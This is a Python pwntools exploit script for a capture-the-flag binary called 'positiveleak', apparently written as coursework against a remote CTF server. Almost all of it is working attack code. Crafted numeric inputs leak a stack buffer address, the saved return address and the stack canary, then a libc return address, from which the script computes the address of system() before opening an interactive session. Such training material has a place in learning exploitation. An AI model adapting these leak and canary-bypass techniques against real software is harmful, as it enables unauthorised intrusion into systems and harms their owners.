from pwn import *
import time
import subprocess
import sys
import warnings
import re

def print_red(str):
	print("\033[91m" + str + "\033[0m")

def genbin(binary_name):
	command = f"genbin ~/challenges/playroom/shellcodes/{binary_name}"
	try:
		return bytes.fromhex(subprocess.check_output(command, shell=True, universal_newlines=True))
	except (subprocess.CalledProcessError, ValueError) as e:
		print(f"An exception occurred: {e}")
		exit(-1)

context.terminal = ['tmux', 'splitw', '-h']
#context.log_level = "error"

# breakpoints
add_numbers = "add_numbers:167"

def leak_buffer(r):
    r.sendline(b"0")
    time.sleep(0.2)
    r.sendline(b"0") # add 0 numbers
    time.sleep(0.2)
    r.sendline(b"")
    time.sleep(0.2)
    r.recvrepeat(timeout=0.2)
    r.sendline(b"1")
    time.sleep(0.2)
    buffer = int(r.recvlineS(keepends=False)) - 0x70
    r.recvrepeat(timeout=0.2)
    return buffer

def leak_sRIP_main(r):
    r.sendline(b"0")
    time.sleep(0.2)
    r.sendline(b"1") # add 1 numbers
    time.sleep(0.2)
    r.sendline(b"")
    time.sleep(0.2)
    r.sendline(b"")
    time.sleep(0.2)
    r.recvrepeat(timeout=0.2)
    r.sendline(b"1")
    time.sleep(0.2)
    r.recvline()
    sRIP_main = int(r.recvlineS(keepends=False)) + 0x027e
    r.recvrepeat(timeout=0.2)
    return sRIP_main

def leak_canary(r, buffer):
    r.sendline(b"0")
    time.sleep(0.2)
    r.sendline(b"14") # add 14 numbers
    time.sleep(0.2)
    for i in range(9):
        r.sendline(b"")
        time.sleep(0.2)
    r.sendline(b"42949672959")  # i = 9
    time.sleep(0.2)
    r.sendline(b"60129542143")  # temp_numbers = 13
    time.sleep(0.2)
    r.sendline(b"")             # number
    time.sleep(0.2)
    r.sendline(str(buffer).encode())
    time.sleep(0.2)
    r.sendline(b"-1")           # im on top of the canary but I dont want overwrite it
    time.sleep(0.2)
    r.recvrepeat(timeout=0.2)
    r.sendline(b"1")
    time.sleep(0.2)
    r.recvlines(13)
    canary = int(r.recvlineS(keepends=False))
    r.recvrepeat(timeout=0.2)
    return canary

def compute_system(libc_leak):
   return libc_leak & 0xfffffffffff00000 | 0x0000000000050d60

def leak_libc(r, buffer, canary, sRIP):
    r.sendline(b"0")
    time.sleep(0.2)
    r.sendline(b"14")                   # add 14 numbers
    time.sleep(0.2)
    for i in range(9):
        r.sendline(b"")
        time.sleep(0.2)
    r.sendline(b"42949672959")          # i = 9
    time.sleep(0.2)
    r.sendline(b"77309411327")          # temp_numbers = 17
    time.sleep(0.2)
    r.sendline(b"")                     # number
    time.sleep(0.2)
    r.sendline(str(buffer).encode())    # buffer
    time.sleep(0.2)
    r.sendline(str(canary).encode())    # canary
    time.sleep(0.2)
    r.sendline(b"")                     # sRBP (main)
    time.sleep(0.2)
    r.sendline(str(sRIP).encode())      # sRIP (main)
    time.sleep(0.2)
    r.sendline(b"")                     # sRBP (__libc_call_main)
    time.sleep(0.2)
    r.sendline(b"-1")                   # on top of sRIP (__libc_call_main)
    time.sleep(0.2)
    r.recvrepeat(timeout=0.2)
    r.sendline(b"1")
    time.sleep(0.2)
    r.recvlines(17)
    sRIP_libc = int(r.recvlineS(keepends=False))
    r.recvrepeat(timeout=0.2)
    return sRIP_libc

if args["REMOTE"]:
	r = remote("bin.offdef.jinblack.it", 3003)
else:
    r = process("./positiveleak")
    if args["DEBUG"]:
        gdb.attach(r, f"""
        b {add_numbers}
        unset env
        set disable-randomization off
        c
        """)
        input("wait")

buffer = leak_buffer(r)
sRIP_main = leak_sRIP_main(r)
canary = leak_canary(r, buffer)
sRIP_libc = leak_libc(r, buffer, canary, sRIP_main)
libc_system = compute_system(sRIP_libc)
print("buffer:\t", hex(buffer))
print("sRIP:\t", hex(sRIP_main))
print("canary:\t", hex(canary))
print("sRIP_libc:\t", hex(sRIP_libc))
print("libc_system:\t", hex(libc_system))
r.interactive()
